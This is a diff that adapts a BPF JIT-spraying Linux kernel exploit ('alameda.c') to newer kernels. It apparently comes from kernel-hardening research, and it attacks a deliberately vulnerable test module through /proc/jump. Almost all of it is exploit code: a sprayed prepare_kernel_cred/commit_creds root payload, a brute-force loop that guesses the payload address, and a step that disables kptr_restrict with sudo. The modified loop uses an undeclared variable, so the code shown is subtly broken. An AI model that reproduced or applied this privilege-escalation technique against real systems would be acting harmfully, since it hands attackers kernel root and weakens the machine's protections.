@@ -6,6 +6,19 @@
     by Keegan McAllister
     http://mainisusuallyafunction.blogspot.com/
 
+    Modified for modern kernels by
+    Elena Reshetova <elena.reshetova@intel.com>
+
+    Main changes in modification:
+    - Payload is srayed in a loop multiple times for each filer to
+      get over 1 page in size
+    - Each payload part is prefixed by two sets of emit(0x90) commands
+      for more reliable discovery at the page start
+    - Address guessing logic is modified
+    - Reading addresses from /proc/kallsyms is now restricted.
+      Therefore we need kptr_restrict to be disabled to fetch them
+
+    Modification is tested on Ubuntu VM with 4.4.0-rc5-custom kernel installed
 
     Mechanisms like Supervisor Mode Execution Protection or PaX's
     KERNEXEC prevent the kernel from executing memory provided by
@@ -62,6 +75,10 @@
             # or echo 2 to enable debug output, which makes life
             # unreasonably easy for the exploit
 
+	echo 0 | sudo tee /proc/sys/kernel/kptr_restrict
+	    # this is needed to fetch the prepare_kernel_cred and
+	    # commit_creds addresses
+
         gcc -Wall -O2 -o alameda alameda.c
         ./alameda
 
@@ -105,6 +122,10 @@
 size_t code_len = 0;
 struct sock_filter code[MAX_CODE_LEN];
 struct sock_fprog  filt;
+
+static unsigned int pgnum;
+static unsigned int pgnumFinished = 1;
+static unsigned int pgnumIncr = 0;
 
 // Emit a BPF instruction.
 void emit_bpf(uint16_t opcode, uint32_t operand) {
@@ -182,16 +203,18 @@ void get_root(uint64_t payload_addr);
 //
 // The range described by mm.txt (and defined below) is actually only 1.5 GB.
 //
-#define MODULE_START 0xffffffffa0000000UL
+
+#define MODULE_START 0xffffffffa6000000UL
 #define MODULE_END   0xfffffffffff00000UL
 #define MODULE_PAGES ((MODULE_END - MODULE_START) / 0x1000)
 
 // The offset into the JIT-produced code page where we want to land.
 // This skips an "xor %eax, %eax" (31c0) and the initial b8 opcode.
-#define PAYLOAD_OFFSET 3
+#define PAYLOAD_OFFSET 65
 
 // Some boring stuff.
 int      check_bpf_jit();
+void     check_kptr_restrict();
 uint32_t get_kernel_symbol(const char *name);
 
 // Useful when BPF JIT debug output is enabled.
@@ -206,25 +229,38 @@ void create_socket_tree(int parent, size_t depth);
 
 // File descriptors.
 int socket_fds[2] = { -1, -1 };
-int jump_fd;
+static int jump_fd;
 int urandom = -1;
+
+void emit_payload()
+{
+    emit1(0x90);
+    emit1(0x90);
+    // Embed a kernel get-root payload into the BPF program.
+    emit3(0x48, 0x31, 0xff);  // xor  %rdi, %rdi
+    emit_call(get_kernel_symbol("prepare_kernel_cred"));
+    emit3(0x48, 0x89, 0xc7);  // mov  %rax, %rdi
+    emit_call(get_kernel_symbol("commit_creds"));
+}
 
 int main() {
     int debug_enabled, status;
-    unsigned int pgnum;
     pid_t pid;
 
     // Make sure the BPF JIT is enabled, and check if we have access to
     // debug output.  If we do, we can get the exact payload address.
     debug_enabled = check_bpf_jit();
 
-    // Embed a kernel get-root payload into the BPF program.
-    emit3(0x48, 0x31, 0xff);  // xor  %rdi, %rdi
-    emit_call(get_kernel_symbol("prepare_kernel_cred"));
-    emit3(0x48, 0x89, 0xc7);  // mov  %rax, %rdi
-    emit_call(get_kernel_symbol("commit_creds"));
-    emit1(0xc3);              // ret
+    //currently we need kptr_restrict to be 0 in order for the 
+    // get_kernel_symbol() function to succeed.
+    // Real exploit would have to figure the address in some other way. 
+    check_kptr_restrict();
 
+    for(i=0;i<70;i++) {
+    	emit_payload();
+	emit1(0xc3);
+    }
+    
     // Alternatively we could just disable SMEP by clearing bit 20 in
     // %cr4, and then jump to a traditional payload in a userspace
     // page.  This has that advantage that we don't immediately need
@@ -257,8 +293,10 @@ int main() {
         errno_die("open(\"/proc/jump\")");
 
     // If we have debug output, get the exact filter address and win.
-    if (debug_enabled)
+    if (debug_enabled) {
+        printf("target address: %lx", read_filter_addr_from_dmesg() + PAYLOAD_OFFSET);
         get_root(read_filter_addr_from_dmesg() + PAYLOAD_OFFSET);
+    }
 
     // Otherwise we have to guess.
     if ((urandom = open("/dev/urandom", O_RDONLY)) < 0)
@@ -267,29 +305,44 @@ int main() {
     printf("[+] guessing filter address");
     fflush(stdout);
     do {
-        // A bad guess will likely oops the kernel and kill the current process.
-        // So we fork off a child process to do the guessing.
-        if (!(pid = fork())) {
-            putchar('.');
-            fflush(stdout);
-
-            // Take a guess at the payload address.
-            // We know it's PAYLOAD_OFFSET from the beginning of some page in the
-            // region used for kernel modules.
+    	if (jump_fd)
+            close(jump_fd);
+    	// Prepare to exploit jump.ko.
+    	if ((jump_fd = open("/proc/jump", O_WRONLY)) < 0)
+            errno_die("open(\"/proc/jump\")");
+	if (pgnumFinished == 1) {
             if (read(urandom, &pgnum, sizeof(pgnum)) < sizeof(pgnum))
                 errno_die("read");
             pgnum %= MODULE_PAGES;
-            get_root(MODULE_START + (0x1000 * pgnum) + PAYLOAD_OFFSET);
+	}
+
+        // A bad guess will likely oops the kernel and kill the current process.
+        // So we fork off a child process to do the guessing.
+        if (!(pid = fork())) {
+            printf("\npgnum: %x, pgnumIncr: %d", pgnum, pgnumIncr);
+            printf("\nattempt: %lx", MODULE_START + (0x10 * pgnum) + pgnumIncr);
+            fflush(stdout);
+            get_root(MODULE_START + (0x10 * pgnum) + pgnumIncr);
+            continue;
         } else {
             if (pid < 0)
                 errno_die("fork");
-
             // FIXME: handle EINTR here?
             if (wait(&status) < 0)
                 errno_die("wait");
         }
-    // Keep trying if the child got SIGKILL (probably due to kernel oops) or
-    // exited by calling die().
+    	// Keep trying if the child got SIGKILL (probably due to kernel oops) or
+    	// exited by calling die().
+	if (pgnumFinished == 1) {
+	    pgnumFinished = 0;
+	    pgnumIncr = 1;
+	} else if (pgnumIncr == 10){
+	    //this is the last offset tried
+	    pgnumFinished = 1;
+	    pgnumIncr = 0;
+	} else {
+	    pgnumIncr += 1;
+	}
     } while ((WIFSIGNALED(status) && (WTERMSIG(status) == SIGKILL))
              || (WIFEXITED(status) && (WEXITSTATUS(status) == FAILURE_CODE)));
 
@@ -302,12 +355,23 @@ int main() {
 // Exploit jump.ko, transferring kernel control flow to payload_addr.
 void get_root(uint64_t payload_addr) {
     if (write(jump_fd, &payload_addr, sizeof(payload_addr))
-            < sizeof(payload_addr))
+            < sizeof(payload_addr)) {
+        printf("failed\n");
+        fflush(stdout);
         errno_die("write");
+    }
+
+    printf("\nWasn't killed!");
+    fflush(stdout);
 
     putchar('\n');
-    if (getuid() != 0)
+    if (getuid() != 0) {
+        printf("\nFailed to get root!");
+        fflush(stdout);
         die("failed to get root");
+    }
+    printf("\ngot root!");
+    fflush(stdout);
     info("got root!");
 
     // Clean up after ourselves.
@@ -436,6 +500,20 @@ int check_bpf_jit() {
     }
 }
 
+// Check if kptr_restrict is enabled to fetch addresses sucessfully
+void check_kptr_restrict() {
+    const char *kptr_restrict_enable = "/proc/sys/kernel/kptr_restrict";
+    int mode;
+
+    FILE *f = fopen(kptr_restrict_enable, "r");
+    if (!f || (fscanf(f, "%d", &mode) < 1))
+        die("could not read %s", kptr_restrict_enable);
+    fclose(f);
+
+    if (mode != 0)
+        die("kptr_restrict is enabled. Disable it to fetch creds call addresses");
+}
+
 // Super crappy kernel symbol lookup.
 // Obviously, you could make this smarter in a real exploit.
 uint32_t get_kernel_symbol(const char *name) {
@@ -453,7 +531,7 @@ uint32_t get_kernel_symbol(const char *name) {
         die("%s = %lx will not sign-extend from 32 bits", name, addr);
 
     fclose(f);
-    info("found %s = %lx", name, addr);
+    //info("found %s = %lx", name, addr);
     return (addr & 0xffffffff);
 }
 
@@ -461,7 +539,7 @@ uint32_t get_kernel_symbol(const char *name) {
 uint64_t read_filter_addr_from_dmesg() {
     uint64_t addr;
     FILE *f = popen(
-        "dmesg | perl -lne 'print $1 if m/ image=([0-9a-f]+)$/' | tail -n 1",
+        "dmesg | perl -lne 'print $1 if m/ image=([0-9a-f]+)/' | tail -n 1",
         "r");
 
     if (!f || (fscanf(f, "%lx", &addr) < 1))
